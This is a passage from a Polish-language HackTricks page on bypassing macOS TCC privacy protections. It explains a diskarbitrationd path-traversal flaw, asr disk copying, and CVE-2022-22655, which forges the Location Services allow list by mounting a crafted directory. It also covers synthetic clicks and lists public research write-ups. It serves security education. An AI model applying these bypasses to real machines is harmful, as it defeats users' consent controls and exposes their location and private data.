Jak wyjaśniono w [oryginalnym opisie](https://www.kandji.io/blog/macos-audit-story-part2), ten CVE wykorzystywał `diskarbitrationd`.<sup>[[16]](#references)</sup>

Funkcja `DADiskMountWithArgumentsCommon` z publicznego frameworka `DiskArbitration` przeprowadzała kontrole bezpieczeństwa. Można je jednak ominąć, wywołując bezpośrednio `diskarbitrationd`, a tym samym używając w ścieżce elementów `../` i dowiązań symbolicznych.

Pozwalało to atakującemu montować dowolne systemy plików w dowolnej lokalizacji, również na bazie danych TCC, dzięki uprawnieniu `com.apple.private.security.storage-exempt.heritable` procesu `diskarbitrationd`.

### asr

Narzędzie **`/usr/sbin/asr`** umożliwiało skopiowanie całego dysku i zamontowanie go w innym miejscu z pominięciem zabezpieczeń TCC.

### CVE-2022-22655 - Usługi lokalizacji

Usługi lokalizacji **nie** są przechowywane w bazie danych TCC, tak jak inne usługi. Zarządza nimi `locationd`, który przechowuje własną listę dozwolonych elementów w **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Każdy wpis jest indeksowany przez klienta (bundle ID lub ścieżkę pliku wykonywalnego) i zawiera pola takie jak `Authorized`, `BundleId`, `Executable` i `Registered`.<sup>[[4]](#references)</sup>

Sam plik `clients.plist` jest chroniony przez Sandbox/TCC i nie można go edytować nawet z uprawnieniami roota — ale **katalog `/var/db/locationd/` nie był chroniony przed montowaniem**. Atakujący działający z uprawnieniami roota mógł więc utworzyć obraz dysku zawierający własny plik `clients.plist` (z jego plikiem binarnym oznaczonym jako `Authorized`), zamontować go w miejscu tego katalogu i ponownie uruchomić `locationd`, aby sfałszowana lista dozwolonych zaczęła obowiązywać.<sup>[[3]](#references)</sup>

> [!TIP]
> To ten sam schemat co w opisanych wyżej obejściach TCC z użyciem `hdiutil`/`mount`: chroniony jest *plik*, ale nie *katalog, w którym się znajduje*, więc zamiast pliku podmieniasz cały katalog.

## Za pomocą aplikacji startowych


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Za pomocą grep

W wielu przypadkach pliki przechowują poufne informacje, takie jak adresy e-mail, numery telefonów, wiadomości... w niezabezpieczonych lokalizacjach (co Apple uznaje za podatność).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Ta metoda już nie działa, ale [**działała w przeszłości**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Inny sposób wykorzystuje [**zdarzenia CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: obejście frameworka Transparency, Consent, and Control (TCC) w macOS](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Przypadkowe i celowe obchodzenie zabezpieczeń prywatności użytkowników macOS w TCC](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 — obejście zabezpieczeń usług lokalizacyjnych TCC (oryginalny raport)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Gdzie na świecie jest Carmen Sandiego: nadużywanie usług lokalizacyjnych w macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs — CVE-2024-44131: obejście TCC wykrada dane z iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite — `test_sqllog.c` (zmienne środowiskowe `SQLITE_ENABLE_SQLLOG`)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple — uprawnienie Allow DYLD environment variables](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company — Notaryzacja: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [W złośliwym oprogramowaniu XCSSET wykryto obejście TCC typu zero-day](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: „Co dzieje się na Twoim Macu, zostaje w iCloud Apple?!” — Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Nowa podatność macOS „powerdir” może umożliwić nieautoryzowany dostęp do danych użytkownika](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Zmiana katalogu domowego i obejście TCC, czyli CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Odtwarzanie muzyki i obejście TCC, czyli CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Jak obrabować (Fire)foxa](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 — obejście TCC za pomocą Telegrama w macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji — odkrywanie podatności Apple: audyt diskarbitrationd i storagekitd, część 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle — Objective by the Sea v2.0: Synthetic Clicks i przechwytywanie zdarzeń CoreGraphics](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking — proof of concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow — ustawianie zmiennych środowiskowych w OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit — CVE-2020-9771: obejście TCC i eskalacja uprawnień przez mount_apfs](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit — CVE-2021-30808: obejście TCC przez zamontowanie systemu plików w miejscu bazy danych TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Ponad 20 sposobów na obejście mechanizmów ochrony prywatności w macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Zwycięstwo nad TCC — ponad 20 nowych sposobów na obejście mechanizmów ochrony prywatności w macOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Od Spotlight do Apple Intelligence — nadużycie 0daya w celu wykradzenia danych zasilających AI w macOS](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
